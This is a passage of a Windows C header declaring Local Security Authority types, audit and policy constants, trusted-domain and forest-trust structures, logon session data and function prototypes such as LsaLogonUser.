    SeAdtParmTypePtr,               //Produces 1 parameter
    SeAdtParmTypeTime,              //Produces 2 parameters
    SeAdtParmTypeGuid,              //Produces 1 parameter
    SeAdtParmTypeLuid,              //
    SeAdtParmTypeHexInt64,          //Produces 1 parameter
    SeAdtParmTypeStringList,        //Produces 1 parameter
    SeAdtParmTypeSidList,           //Produces 1 parameter
    SeAdtParmTypeDuration,          //Produces 1 parameters
    SeAdtParmTypeUserAccountControl,//Produces 3 parameters
    SeAdtParmTypeNoUac,             //Produces 3 parameters
    SeAdtParmTypeMessage,           //Produces 1 Parameter
    SeAdtParmTypeDateTime,          //Produces 1 Parameter
    SeAdtParmTypeSockAddr,          // Produces 2 parameters
    SeAdtParmTypeSD,                // Produces 1 parameters
    SeAdtParmTypeLogonHours,        // Produces 1 parameters
    SeAdtParmTypeLogonIdNoSid,      //Produces 3 parameters.
    SeAdtParmTypeUlongNoConv,       // Produces 1 parameter.
    SeAdtParmTypeSockAddrNoPort,     // Produces 1 parameter
    SeAdtParmTypeAccessReason

} SE_ADT_PARAMETER_TYPE, *PSE_ADT_PARAMETER_TYPE;

#if !defined(GUID_DEFINED)
#include <guiddef.h>
#endif /* GUID_DEFINED */

typedef struct _SE_ADT_OBJECT_TYPE {
    GUID ObjectType;
    USHORT Flags;
#define SE_ADT_OBJECT_ONLY 0x1
    USHORT Level;
    ACCESS_MASK AccessMask;
} SE_ADT_OBJECT_TYPE, *PSE_ADT_OBJECT_TYPE;

typedef struct _SE_ADT_PARAMETER_ARRAY_ENTRY {

    SE_ADT_PARAMETER_TYPE Type;
    ULONG Length;
    ULONG_PTR Data[2];
    PVOID Address;
} SE_ADT_PARAMETER_ARRAY_ENTRY, *PSE_ADT_PARAMETER_ARRAY_ENTRY;


typedef struct _SE_ADT_ACCESS_REASON{
    ACCESS_MASK AccessMask;
    ULONG  AccessReasons[32];
    ULONG  ObjectTypeIndex;
    ULONG AccessGranted;
    PSECURITY_DESCRIPTOR SecurityDescriptor;
} SE_ADT_ACCESS_REASON, *PSE_ADT_ACCESS_REASON;

#define SE_MAX_AUDIT_PARAMETERS 32
#define SE_MAX_GENERIC_AUDIT_PARAMETERS 28

typedef struct _SE_ADT_PARAMETER_ARRAY {

    ULONG CategoryId;
    ULONG AuditId;
    ULONG ParameterCount;
    ULONG Length;
    USHORT FlatSubCategoryId;
    USHORT Type;
    ULONG Flags;
    SE_ADT_PARAMETER_ARRAY_ENTRY Parameters[ SE_MAX_AUDIT_PARAMETERS ];

} SE_ADT_PARAMETER_ARRAY, *PSE_ADT_PARAMETER_ARRAY;

#define SE_ADT_PARAMETERS_SELF_RELATIVE     0x00000001
#define SE_ADT_PARAMETERS_SEND_TO_LSA       0x00000002
#define SE_ADT_PARAMETER_EXTENSIBLE_AUDIT   0x00000004
#define SE_ADT_PARAMETER_GENERIC_AUDIT      0x00000008
#define SE_ADT_PARAMETER_WRITE_SYNCHRONOUS  0x00000010

#define LSAP_SE_ADT_PARAMETER_ARRAY_TRUE_SIZE(AuditParameters)    \
     ( sizeof(SE_ADT_PARAMETER_ARRAY) -                           \
       sizeof(SE_ADT_PARAMETER_ARRAY_ENTRY) *                     \
       (SE_MAX_AUDIT_PARAMETERS - AuditParameters->ParameterCount) )

#endif // !defined(_NTLSA_AUDIT_)

typedef enum _POLICY_AUDIT_EVENT_TYPE {

    AuditCategorySystem = 0,
    AuditCategoryLogon,
    AuditCategoryObjectAccess,
    AuditCategoryPrivilegeUse,
    AuditCategoryDetailedTracking,
    AuditCategoryPolicyChange,
    AuditCategoryAccountManagement,
    AuditCategoryDirectoryServiceAccess,
    AuditCategoryAccountLogon

} POLICY_AUDIT_EVENT_TYPE, *PPOLICY_AUDIT_EVENT_TYPE;

#define POLICY_AUDIT_EVENT_UNCHANGED       (0x00000000L)
#define POLICY_AUDIT_EVENT_SUCCESS         (0x00000001L)
#define POLICY_AUDIT_EVENT_FAILURE         (0x00000002L)
#define POLICY_AUDIT_EVENT_NONE            (0x00000004L)

#define POLICY_AUDIT_EVENT_MASK \
    (POLICY_AUDIT_EVENT_SUCCESS | \
     POLICY_AUDIT_EVENT_FAILURE | \
     POLICY_AUDIT_EVENT_UNCHANGED | \
     POLICY_AUDIT_EVENT_NONE)

#define LSA_SUCCESS(Error) ((LONG)(Error) >= 0)

NTSTATUS
NTAPI
LsaRegisterLogonProcess (
	IN PLSA_STRING LogonProcessName,
	OUT PHANDLE LsaHandle,
	OUT PLSA_OPERATIONAL_MODE SecurityMode
	);

NTSTATUS
NTAPI
LsaLogonUser (
	IN HANDLE LsaHandle,
	IN PLSA_STRING OriginName,
	IN SECURITY_LOGON_TYPE LogonType,
	IN ULONG AuthenticationPackage,
	IN PVOID AuthenticationInformation,
	IN ULONG AuthenticationInformationLength,
	IN OPTIONAL PTOKEN_GROUPS LocalGroups,
	IN PTOKEN_SOURCE SourceContext,
	OUT PVOID *ProfileBuffer,
	OUT PULONG ProfileBufferLength,
	OUT PLUID LogonId,
	OUT PHANDLE Token,
	OUT PQUOTA_LIMITS Quotas,
	OUT PNTSTATUS SubStatus
	);

NTSTATUS
NTAPI
LsaLookupAuthenticationPackage (
	IN HANDLE LsaHandle,
	IN PLSA_STRING PackageName,
	OUT PULONG AuthenticationPackage
	);

NTSTATUS
NTAPI
LsaFreeReturnBuffer (
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaCallAuthenticationPackage (
	IN HANDLE LsaHandle,
	IN ULONG AuthenticationPackage,
	IN PVOID ProtocolSubmitBuffer,
	IN ULONG SubmitBufferLength,
	OUT OPTIONAL PVOID *ProtocolReturnBuffer,
	OUT OPTIONAL PULONG ReturnBufferLength,
	OUT OPTIONAL PNTSTATUS ProtocolStatus
	);

NTSTATUS
NTAPI
LsaDeregisterLogonProcess (
	IN HANDLE LsaHandle
	);

NTSTATUS
NTAPI
LsaConnectUntrusted (
	OUT PHANDLE LsaHandle
	);

////////////////////////////////////////////////////////////////////////////
//                                                                        //
// Local Security Policy Administration API datatypes and defines         //
//                                                                        //
////////////////////////////////////////////////////////////////////////////

#define POLICY_VIEW_LOCAL_INFORMATION              0x00000001L
#define POLICY_VIEW_AUDIT_INFORMATION              0x00000002L
#define POLICY_GET_PRIVATE_INFORMATION             0x00000004L
#define POLICY_TRUST_ADMIN                         0x00000008L
#define POLICY_CREATE_ACCOUNT                      0x00000010L
#define POLICY_CREATE_SECRET                       0x00000020L
#define POLICY_CREATE_PRIVILEGE                    0x00000040L
#define POLICY_SET_DEFAULT_QUOTA_LIMITS            0x00000080L
#define POLICY_SET_AUDIT_REQUIREMENTS              0x00000100L
#define POLICY_AUDIT_LOG_ADMIN                     0x00000200L
#define POLICY_SERVER_ADMIN                        0x00000400L
#define POLICY_LOOKUP_NAMES                        0x00000800L
#define POLICY_NOTIFICATION                        0x00001000L

#define POLICY_ALL_ACCESS     (STANDARD_RIGHTS_REQUIRED         |\
                               POLICY_VIEW_LOCAL_INFORMATION    |\
                               POLICY_VIEW_AUDIT_INFORMATION    |\
                               POLICY_GET_PRIVATE_INFORMATION   |\
                               POLICY_TRUST_ADMIN               |\
                               POLICY_CREATE_ACCOUNT            |\
                               POLICY_CREATE_SECRET             |\
                               POLICY_CREATE_PRIVILEGE          |\
                               POLICY_SET_DEFAULT_QUOTA_LIMITS  |\
                               POLICY_SET_AUDIT_REQUIREMENTS    |\
                               POLICY_AUDIT_LOG_ADMIN           |\
                               POLICY_SERVER_ADMIN              |\
                               POLICY_LOOKUP_NAMES)


#define POLICY_READ           (STANDARD_RIGHTS_READ             |\
                               POLICY_VIEW_AUDIT_INFORMATION    |\
                               POLICY_GET_PRIVATE_INFORMATION)

#define POLICY_WRITE          (STANDARD_RIGHTS_WRITE            |\
                               POLICY_TRUST_ADMIN               |\
                               POLICY_CREATE_ACCOUNT            |\
                               POLICY_CREATE_SECRET             |\
                               POLICY_CREATE_PRIVILEGE          |\
                               POLICY_SET_DEFAULT_QUOTA_LIMITS  |\
                               POLICY_SET_AUDIT_REQUIREMENTS    |\
                               POLICY_AUDIT_LOG_ADMIN           |\
                               POLICY_SERVER_ADMIN)

#define POLICY_EXECUTE        (STANDARD_RIGHTS_EXECUTE          |\
                               POLICY_VIEW_LOCAL_INFORMATION    |\
                               POLICY_LOOKUP_NAMES)

typedef struct _LSA_TRANSLATED_SID {

    SID_NAME_USE Use;
    ULONG RelativeId;
    LONG DomainIndex;

} LSA_TRANSLATED_SID, *PLSA_TRANSLATED_SID;

typedef enum _POLICY_LSA_SERVER_ROLE {

    PolicyServerRoleBackup = 2,
    PolicyServerRolePrimary

} POLICY_LSA_SERVER_ROLE, *PPOLICY_LSA_SERVER_ROLE;

#if (_WIN32_WINNT < 0x0502)

typedef enum _POLICY_SERVER_ENABLE_STATE {

    PolicyServerEnabled = 2,
    PolicyServerDisabled

} POLICY_SERVER_ENABLE_STATE, *PPOLICY_SERVER_ENABLE_STATE;
#endif

typedef ULONG POLICY_AUDIT_EVENT_OPTIONS, *PPOLICY_AUDIT_EVENT_OPTIONS;

typedef enum _POLICY_INFORMATION_CLASS {

    PolicyAuditLogInformation = 1,
    PolicyAuditEventsInformation,
    PolicyPrimaryDomainInformation,
    PolicyPdAccountInformation,
    PolicyAccountDomainInformation,
    PolicyLsaServerRoleInformation,
    PolicyReplicaSourceInformation,
    PolicyDefaultQuotaInformation,
    PolicyModificationInformation,
    PolicyAuditFullSetInformation,
    PolicyAuditFullQueryInformation,
    PolicyDnsDomainInformation,
    PolicyDnsDomainInformationInt,
    PolicyLocalAccountDomainInformation,
    PolicyLastEntry

} POLICY_INFORMATION_CLASS, *PPOLICY_INFORMATION_CLASS;

typedef struct _POLICY_AUDIT_LOG_INFO {

    ULONG AuditLogPercentFull;
    ULONG MaximumLogSize;
    LARGE_INTEGER AuditRetentionPeriod;
    BOOLEAN AuditLogFullShutdownInProgress;
    LARGE_INTEGER TimeToShutdown;
    ULONG NextAuditRecordId;

} POLICY_AUDIT_LOG_INFO, *PPOLICY_AUDIT_LOG_INFO;

typedef struct _POLICY_AUDIT_EVENTS_INFO {

    BOOLEAN AuditingMode;
    PPOLICY_AUDIT_EVENT_OPTIONS EventAuditingOptions;
    ULONG MaximumAuditEventCount;

} POLICY_AUDIT_EVENTS_INFO, *PPOLICY_AUDIT_EVENTS_INFO;

typedef struct _POLICY_AUDIT_SUBCATEGORIES_INFO {

    ULONG MaximumSubCategoryCount;
    PPOLICY_AUDIT_EVENT_OPTIONS EventAuditingOptions;

} POLICY_AUDIT_SUBCATEGORIES_INFO, *PPOLICY_AUDIT_SUBCATEGORIES_INFO;

typedef struct _POLICY_AUDIT_CATEGORIES_INFO {

    ULONG MaximumCategoryCount;
    PPOLICY_AUDIT_SUBCATEGORIES_INFO SubCategoriesInfo;

} POLICY_AUDIT_CATEGORIES_INFO, *PPOLICY_AUDIT_CATEGORIES_INFO;

//
// Valid bits for Per user policy mask.
//

#define PER_USER_POLICY_UNCHANGED               (0x00)
#define PER_USER_AUDIT_SUCCESS_INCLUDE          (0x01)
#define PER_USER_AUDIT_SUCCESS_EXCLUDE          (0x02)
#define PER_USER_AUDIT_FAILURE_INCLUDE          (0x04)
#define PER_USER_AUDIT_FAILURE_EXCLUDE          (0x08)
#define PER_USER_AUDIT_NONE                     (0x10)


#define VALID_PER_USER_AUDIT_POLICY_FLAG (PER_USER_AUDIT_SUCCESS_INCLUDE | \
                                          PER_USER_AUDIT_SUCCESS_EXCLUDE | \
                                          PER_USER_AUDIT_FAILURE_INCLUDE | \
                                          PER_USER_AUDIT_FAILURE_EXCLUDE | \
                                          PER_USER_AUDIT_NONE)

typedef struct _POLICY_PRIMARY_DOMAIN_INFO {

    LSA_UNICODE_STRING Name;
    PSID Sid;

} POLICY_PRIMARY_DOMAIN_INFO, *PPOLICY_PRIMARY_DOMAIN_INFO;

typedef struct _POLICY_PD_ACCOUNT_INFO {

    LSA_UNICODE_STRING Name;

} POLICY_PD_ACCOUNT_INFO, *PPOLICY_PD_ACCOUNT_INFO;

typedef struct _POLICY_LSA_SERVER_ROLE_INFO {

    POLICY_LSA_SERVER_ROLE LsaServerRole;

} POLICY_LSA_SERVER_ROLE_INFO, *PPOLICY_LSA_SERVER_ROLE_INFO;

typedef struct _POLICY_REPLICA_SOURCE_INFO {

    LSA_UNICODE_STRING ReplicaSource;
    LSA_UNICODE_STRING ReplicaAccountName;

} POLICY_REPLICA_SOURCE_INFO, *PPOLICY_REPLICA_SOURCE_INFO;

typedef struct _POLICY_DEFAULT_QUOTA_INFO {

    QUOTA_LIMITS QuotaLimits;

} POLICY_DEFAULT_QUOTA_INFO, *PPOLICY_DEFAULT_QUOTA_INFO;


typedef struct _POLICY_MODIFICATION_INFO {

    LARGE_INTEGER ModifiedId;
    LARGE_INTEGER DatabaseCreationTime;

} POLICY_MODIFICATION_INFO, *PPOLICY_MODIFICATION_INFO;


typedef struct _POLICY_AUDIT_FULL_SET_INFO {

    BOOLEAN ShutDownOnFull;

} POLICY_AUDIT_FULL_SET_INFO, *PPOLICY_AUDIT_FULL_SET_INFO;


typedef struct _POLICY_AUDIT_FULL_QUERY_INFO {

    BOOLEAN ShutDownOnFull;
    BOOLEAN LogIsFull;

} POLICY_AUDIT_FULL_QUERY_INFO, *PPOLICY_AUDIT_FULL_QUERY_INFO;


typedef enum _POLICY_DOMAIN_INFORMATION_CLASS {

#if (_WIN32_WINNT <= 0x0500)
    PolicyDomainQualityOfServiceInformation = 1,
#endif
    PolicyDomainEfsInformation = 2,
    PolicyDomainKerberosTicketInformation

} POLICY_DOMAIN_INFORMATION_CLASS, *PPOLICY_DOMAIN_INFORMATION_CLASS;

#if (_WIN32_WINNT < 0x0502)

#define POLICY_QOS_SCHANNEL_REQUIRED            0x00000001
#define POLICY_QOS_OUTBOUND_INTEGRITY           0x00000002
#define POLICY_QOS_OUTBOUND_CONFIDENTIALITY     0x00000004
#define POLICY_QOS_INBOUND_INTEGRITY            0x00000008
#define POLICY_QOS_INBOUND_CONFIDENTIALITY      0x00000010
#define POLICY_QOS_ALLOW_LOCAL_ROOT_CERT_STORE  0x00000020
#define POLICY_QOS_RAS_SERVER_ALLOWED           0x00000040
#define POLICY_QOS_DHCP_SERVER_ALLOWED          0x00000080

//
// Bits 0x00000100 through 0xFFFFFFFF are reserved for future use.
//
#endif

#if (_WIN32_WINNT == 0x0500)
typedef struct _POLICY_DOMAIN_QUALITY_OF_SERVICE_INFO {

    ULONG QualityOfService;

} POLICY_DOMAIN_QUALITY_OF_SERVICE_INFO, *PPOLICY_DOMAIN_QUALITY_OF_SERVICE_INFO;

#endif

typedef struct _POLICY_DOMAIN_EFS_INFO {

    ULONG   InfoLength;
    PUCHAR  EfsBlob;

} POLICY_DOMAIN_EFS_INFO, *PPOLICY_DOMAIN_EFS_INFO;

#define POLICY_KERBEROS_VALIDATE_CLIENT 0x00000080

typedef struct _POLICY_DOMAIN_KERBEROS_TICKET_INFO {

    ULONG AuthenticationOptions;
    LARGE_INTEGER MaxServiceTicketAge;
    LARGE_INTEGER MaxTicketAge;
    LARGE_INTEGER MaxRenewAge;
    LARGE_INTEGER MaxClockSkew;
    LARGE_INTEGER Reserved;
} POLICY_DOMAIN_KERBEROS_TICKET_INFO, *PPOLICY_DOMAIN_KERBEROS_TICKET_INFO;

typedef enum _POLICY_NOTIFICATION_INFORMATION_CLASS {

    PolicyNotifyAuditEventsInformation = 1,
    PolicyNotifyAccountDomainInformation,
    PolicyNotifyServerRoleInformation,
    PolicyNotifyDnsDomainInformation,
    PolicyNotifyDomainEfsInformation,
    PolicyNotifyDomainKerberosTicketInformation,
    PolicyNotifyMachineAccountPasswordInformation,
    PolicyNotifyGlobalSaclInformation,
    PolicyNotifyMax // must always be the last entry

} POLICY_NOTIFICATION_INFORMATION_CLASS, *PPOLICY_NOTIFICATION_INFORMATION_CLASS;

typedef PVOID LSA_HANDLE, *PLSA_HANDLE;

typedef enum _TRUSTED_INFORMATION_CLASS {

    TrustedDomainNameInformation = 1,
    TrustedControllersInformation,
    TrustedPosixOffsetInformation,
    TrustedPasswordInformation,
    TrustedDomainInformationBasic,
    TrustedDomainInformationEx,
    TrustedDomainAuthInformation,
    TrustedDomainFullInformation,
    TrustedDomainAuthInformationInternal,
    TrustedDomainFullInformationInternal,
    TrustedDomainInformationEx2Internal,
    TrustedDomainFullInformation2Internal,
    TrustedDomainSupportedEncryptionTypes,
} TRUSTED_INFORMATION_CLASS, *PTRUSTED_INFORMATION_CLASS;

typedef struct _TRUSTED_DOMAIN_NAME_INFO {

    LSA_UNICODE_STRING Name;

} TRUSTED_DOMAIN_NAME_INFO, *PTRUSTED_DOMAIN_NAME_INFO;

typedef struct _TRUSTED_CONTROLLERS_INFO {

    ULONG Entries;
    PLSA_UNICODE_STRING Names;

} TRUSTED_CONTROLLERS_INFO, *PTRUSTED_CONTROLLERS_INFO;

typedef struct _TRUSTED_POSIX_OFFSET_INFO {

    ULONG Offset;

} TRUSTED_POSIX_OFFSET_INFO, *PTRUSTED_POSIX_OFFSET_INFO;

typedef struct _TRUSTED_PASSWORD_INFO {
    LSA_UNICODE_STRING Password;
    LSA_UNICODE_STRING OldPassword;
} TRUSTED_PASSWORD_INFO, *PTRUSTED_PASSWORD_INFO;

typedef  LSA_TRUST_INFORMATION TRUSTED_DOMAIN_INFORMATION_BASIC;
typedef PLSA_TRUST_INFORMATION PTRUSTED_DOMAIN_INFORMATION_BASIC;

#define TRUST_DIRECTION_DISABLED        0x00000000
#define TRUST_DIRECTION_INBOUND         0x00000001
#define TRUST_DIRECTION_OUTBOUND        0x00000002
#define TRUST_DIRECTION_BIDIRECTIONAL   (TRUST_DIRECTION_INBOUND | TRUST_DIRECTION_OUTBOUND)

#define TRUST_TYPE_DOWNLEVEL            0x00000001  // NT4 and before
#define TRUST_TYPE_UPLEVEL              0x00000002  // NT5
#define TRUST_TYPE_MIT                  0x00000003  // Trust with a MIT Kerberos realm

#if (_WIN32_WINNT < 0x0502)
#define TRUST_TYPE_DCE                  0x00000004  // Trust with a DCE realm
#endif

// Levels 0x5 - 0x000FFFFF reserved for future use
// Provider specific trust levels are from 0x00100000 to 0xFFF00000

#define TRUST_ATTRIBUTE_NON_TRANSITIVE                0x00000001  // Disallow transitivity
#define TRUST_ATTRIBUTE_UPLEVEL_ONLY                  0x00000002  // Trust link only valid for uplevel client
#if (_WIN32_WINNT == 0x0500)
#define TRUST_ATTRIBUTE_TREE_PARENT     0x00400000  // Denotes that we are setting the trust
                                                    // to our parent in the org tree...
#define TRUST_ATTRIBUTE_TREE_ROOT       0x00800000  // Denotes that we are setting the trust
                                                    // to another tree root in a forest...
// Trust attributes 0x00000004 through 0x004FFFFF reserved for future use
// Trust attributes 0x00F00000 through 0x00400000 are reserved for internal use
// Trust attributes 0x01000000 through 0xFF000000 are reserved for user
#define TRUST_ATTRIBUTES_VALID  0xFF02FFFF
#endif

#if (_WIN32_WINNT < 0x0502)
#define TRUST_ATTRIBUTE_FILTER_SIDS        0x00000004  // Used to quarantine domains
#else
#define TRUST_ATTRIBUTE_QUARANTINED_DOMAIN            0x00000004  // Used to quarantine domains
#endif

#if (_WIN32_WINNT >= 0x0501)
#define TRUST_ATTRIBUTE_FOREST_TRANSITIVE             0x00000008  // This link may contain forest trust information
#if (_WIN32_WINNT >= 0x0502)
#define TRUST_ATTRIBUTE_CROSS_ORGANIZATION            0x00000010  // This trust is to a domain/forest which is not part of this enterprise
#define TRUST_ATTRIBUTE_WITHIN_FOREST                 0x00000020  // Trust is internal to this forest
#define TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL             0x00000040  // Trust is to be treated as external for trust boundary purposes
#if (_WIN32_WINNT >= 0x0600)
#define TRUST_ATTRIBUTE_TRUST_USES_RC4_ENCRYPTION     0x00000080  // MIT trust with RC4
#define TRUST_ATTRIBUTE_TRUST_USES_AES_KEYS           0x00000100  // Use AES keys to encrypte KRB TGTs
#endif
// Trust attributes 0x00000040 through 0x00200000 are reserved for future use
#else
// Trust attributes 0x00000010 through 0x00200000 are reserved for future use
#endif
// Trust attributes 0x00400000 through 0x00800000 were used previously (up to W2K) and should not be re-used
// Trust attributes 0x01000000 through 0x80000000 are reserved for user
#define TRUST_ATTRIBUTES_VALID          0xFF03FFFF
#endif
#define TRUST_ATTRIBUTES_USER           0xFF000000

typedef struct _TRUSTED_DOMAIN_INFORMATION_EX {

    LSA_UNICODE_STRING Name;
    LSA_UNICODE_STRING FlatName;
    PSID  Sid;
    ULONG TrustDirection;
    ULONG TrustType;
    ULONG TrustAttributes;

} TRUSTED_DOMAIN_INFORMATION_EX, *PTRUSTED_DOMAIN_INFORMATION_EX;

typedef struct _TRUSTED_DOMAIN_INFORMATION_EX2 {

    LSA_UNICODE_STRING Name;
    LSA_UNICODE_STRING FlatName;
    PSID  Sid;
    ULONG TrustDirection;
    ULONG TrustType;
    ULONG TrustAttributes;
    ULONG ForestTrustLength;
#ifdef MIDL_PASS
    [size_is( ForestTrustLength )]
#endif
    PUCHAR ForestTrustInfo;

} TRUSTED_DOMAIN_INFORMATION_EX2, *PTRUSTED_DOMAIN_INFORMATION_EX2;

#define TRUST_AUTH_TYPE_NONE    0   // Ignore this entry
#define TRUST_AUTH_TYPE_NT4OWF  1   // NT4 OWF password
#define TRUST_AUTH_TYPE_CLEAR   2   // Cleartext password
#define TRUST_AUTH_TYPE_VERSION 3   // Cleartext password version number

typedef struct _LSA_AUTH_INFORMATION {

    LARGE_INTEGER LastUpdateTime;
    ULONG AuthType;
    ULONG AuthInfoLength;
    PUCHAR AuthInfo;
} LSA_AUTH_INFORMATION, *PLSA_AUTH_INFORMATION;

typedef struct _TRUSTED_DOMAIN_AUTH_INFORMATION {

    ULONG IncomingAuthInfos;
    PLSA_AUTH_INFORMATION   IncomingAuthenticationInformation;
    PLSA_AUTH_INFORMATION   IncomingPreviousAuthenticationInformation;
    ULONG OutgoingAuthInfos;
    PLSA_AUTH_INFORMATION   OutgoingAuthenticationInformation;
    PLSA_AUTH_INFORMATION   OutgoingPreviousAuthenticationInformation;

} TRUSTED_DOMAIN_AUTH_INFORMATION, *PTRUSTED_DOMAIN_AUTH_INFORMATION;

typedef struct _TRUSTED_DOMAIN_FULL_INFORMATION {

    TRUSTED_DOMAIN_INFORMATION_EX   Information;
    TRUSTED_POSIX_OFFSET_INFO       PosixOffset;
    TRUSTED_DOMAIN_AUTH_INFORMATION AuthInformation;

} TRUSTED_DOMAIN_FULL_INFORMATION, *PTRUSTED_DOMAIN_FULL_INFORMATION;

typedef struct _TRUSTED_DOMAIN_FULL_INFORMATION2 {

    TRUSTED_DOMAIN_INFORMATION_EX2  Information;
    TRUSTED_POSIX_OFFSET_INFO       PosixOffset;
    TRUSTED_DOMAIN_AUTH_INFORMATION AuthInformation;

} TRUSTED_DOMAIN_FULL_INFORMATION2, *PTRUSTED_DOMAIN_FULL_INFORMATION2;

typedef struct _TRUSTED_DOMAIN_SUPPORTED_ENCRYPTION_TYPES {

	ULONG SupportedEncryptionTypes;

} TRUSTED_DOMAIN_SUPPORTED_ENCRYPTION_TYPES, *PTRUSTED_DOMAIN_SUPPORTED_ENCRYPTION_TYPES;

typedef enum {

    ForestTrustTopLevelName,
    ForestTrustTopLevelNameEx,
    ForestTrustDomainInfo,
    ForestTrustRecordTypeLast = ForestTrustDomainInfo

} LSA_FOREST_TRUST_RECORD_TYPE;

#if (_WIN32_WINNT < 0x0502)
#define LSA_FOREST_TRUST_RECORD_TYPE_UNRECOGNIZED 0x80000000
#endif

//
// Bottom 16 bits of the flags are reserved for disablement reasons
//

#define LSA_FTRECORD_DISABLED_REASONS            ( 0x0000FFFFL )

//
// Reasons for a top-level name forest trust record to be disabled
//

#define LSA_TLN_DISABLED_NEW                     ( 0x00000001L )
#define LSA_TLN_DISABLED_ADMIN                   ( 0x00000002L )
#define LSA_TLN_DISABLED_CONFLICT                ( 0x00000004L )

//
// Reasons for a domain information forest trust record to be disabled
//

#define LSA_SID_DISABLED_ADMIN                   ( 0x00000001L )
#define LSA_SID_DISABLED_CONFLICT                ( 0x00000002L )
#define LSA_NB_DISABLED_ADMIN                    ( 0x00000004L )
#define LSA_NB_DISABLED_CONFLICT                 ( 0x00000008L )

typedef struct _LSA_FOREST_TRUST_DOMAIN_INFO {

#ifdef MIDL_PASS
    PISID Sid;
#else
    PSID Sid;
#endif
    LSA_UNICODE_STRING DnsName;
    LSA_UNICODE_STRING NetbiosName;

} LSA_FOREST_TRUST_DOMAIN_INFO, *PLSA_FOREST_TRUST_DOMAIN_INFO;


#if (_WIN32_WINNT >= 0x0502)
//
//  To prevent huge data to be passed in, we should put a limit on LSA_FOREST_TRUST_BINARY_DATA.
//      128K is large enough that can't be reached in the near future, and small enough not to
//      cause memory problems.

#define MAX_FOREST_TRUST_BINARY_DATA_SIZE ( 128 * 1024 )
#endif

typedef struct _LSA_FOREST_TRUST_BINARY_DATA {

#ifdef MIDL_PASS
    [range(0, MAX_FOREST_TRUST_BINARY_DATA_SIZE)] ULONG Length;
    [size_is( Length )] PUCHAR Buffer;
#else
    ULONG Length;
    PUCHAR Buffer;
#endif

} LSA_FOREST_TRUST_BINARY_DATA, *PLSA_FOREST_TRUST_BINARY_DATA;

typedef struct _LSA_FOREST_TRUST_RECORD {

    ULONG Flags;
    LSA_FOREST_TRUST_RECORD_TYPE ForestTrustType; // type of record
    LARGE_INTEGER Time;

#ifdef MIDL_PASS
    [switch_type( LSA_FOREST_TRUST_RECORD_TYPE ), switch_is( ForestTrustType )]
#endif

    union {                                       // actual data

#ifdef MIDL_PASS
        [case( ForestTrustTopLevelName,
               ForestTrustTopLevelNameEx )] LSA_UNICODE_STRING TopLevelName;
        [case( ForestTrustDomainInfo )] LSA_FOREST_TRUST_DOMAIN_INFO DomainInfo;
        [default] LSA_FOREST_TRUST_BINARY_DATA Data;
#else
        LSA_UNICODE_STRING TopLevelName;
        LSA_FOREST_TRUST_DOMAIN_INFO DomainInfo;
        LSA_FOREST_TRUST_BINARY_DATA Data;        // used for unrecognized types
#endif
    } ForestTrustData;

} LSA_FOREST_TRUST_RECORD, *PLSA_FOREST_TRUST_RECORD;

#if (_WIN32_WINNT >= 0x0502)
//
// To prevent forest trust blobs of large size, number of records must be
// smaller than MAX_RECORDS_IN_FOREST_TRUST_INFO
//

#define MAX_RECORDS_IN_FOREST_TRUST_INFO 4000
#endif

typedef struct _LSA_FOREST_TRUST_INFORMATION {

#ifdef MIDL_PASS
    [range(0, MAX_RECORDS_IN_FOREST_TRUST_INFO)] ULONG RecordCount;
    [size_is( RecordCount )] PLSA_FOREST_TRUST_RECORD * Entries;
#else
    ULONG RecordCount;
    PLSA_FOREST_TRUST_RECORD * Entries;
#endif

} LSA_FOREST_TRUST_INFORMATION, *PLSA_FOREST_TRUST_INFORMATION;

typedef enum {

    CollisionTdo,
    CollisionXref,
    CollisionOther

} LSA_FOREST_TRUST_COLLISION_RECORD_TYPE;

typedef struct _LSA_FOREST_TRUST_COLLISION_RECORD {

    ULONG Index;
    LSA_FOREST_TRUST_COLLISION_RECORD_TYPE Type;
    ULONG Flags;
    LSA_UNICODE_STRING Name;

} LSA_FOREST_TRUST_COLLISION_RECORD, *PLSA_FOREST_TRUST_COLLISION_RECORD;

typedef struct _LSA_FOREST_TRUST_COLLISION_INFORMATION {

    ULONG RecordCount;
#ifdef MIDL_PASS
    [size_is( RecordCount )]
#endif
    PLSA_FOREST_TRUST_COLLISION_RECORD * Entries;

} LSA_FOREST_TRUST_COLLISION_INFORMATION, *PLSA_FOREST_TRUST_COLLISION_INFORMATION;


//
// LSA Enumeration Context
//

typedef ULONG LSA_ENUMERATION_HANDLE, *PLSA_ENUMERATION_HANDLE;

//
// LSA Enumeration Information
//

typedef struct _LSA_ENUMERATION_INFORMATION {

    PSID Sid;

} LSA_ENUMERATION_INFORMATION, *PLSA_ENUMERATION_INFORMATION;


////////////////////////////////////////////////////////////////////////////
//                                                                        //
// Local Security Policy - Miscellaneous API function prototypes          //
//                                                                        //
////////////////////////////////////////////////////////////////////////////


NTSTATUS
NTAPI
LsaFreeMemory(
	IN OPTIONAL PVOID Buffer
	);

NTSTATUS
NTAPI
LsaClose(
	IN LSA_HANDLE ObjectHandle
	);

#if (_WIN32_WINNT >= 0x0600)

typedef struct _LSA_LAST_INTER_LOGON_INFO {
    LARGE_INTEGER LastSuccessfulLogon;
    LARGE_INTEGER LastFailedLogon;
    ULONG FailedAttemptCountSinceLastSuccessfulLogon;
} LSA_LAST_INTER_LOGON_INFO, *PLSA_LAST_INTER_LOGON_INFO;

#endif

#if (_WIN32_WINNT >= 0x0501)
typedef struct _SECURITY_LOGON_SESSION_DATA {
    ULONG               Size;
    LUID                LogonId;
    LSA_UNICODE_STRING  UserName;
    LSA_UNICODE_STRING  LogonDomain;
    LSA_UNICODE_STRING  AuthenticationPackage;
    ULONG               LogonType;
    ULONG               Session;
    PSID                Sid;
    LARGE_INTEGER       LogonTime;

    LSA_UNICODE_STRING  LogonServer;
    LSA_UNICODE_STRING  DnsDomainName;
    LSA_UNICODE_STRING  Upn;

#if (_WIN32_WINNT >= 0x0600)

    ULONG UserFlags;

    LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
    LSA_UNICODE_STRING LogonScript;
    LSA_UNICODE_STRING ProfilePath;
    LSA_UNICODE_STRING HomeDirectory;
    LSA_UNICODE_STRING HomeDirectoryDrive;

    LARGE_INTEGER LogoffTime;
    LARGE_INTEGER KickOffTime;
    LARGE_INTEGER PasswordLastSet;
    LARGE_INTEGER PasswordCanChange;
    LARGE_INTEGER PasswordMustChange;

#endif
} SECURITY_LOGON_SESSION_DATA, * PSECURITY_LOGON_SESSION_DATA;

NTSTATUS
NTAPI
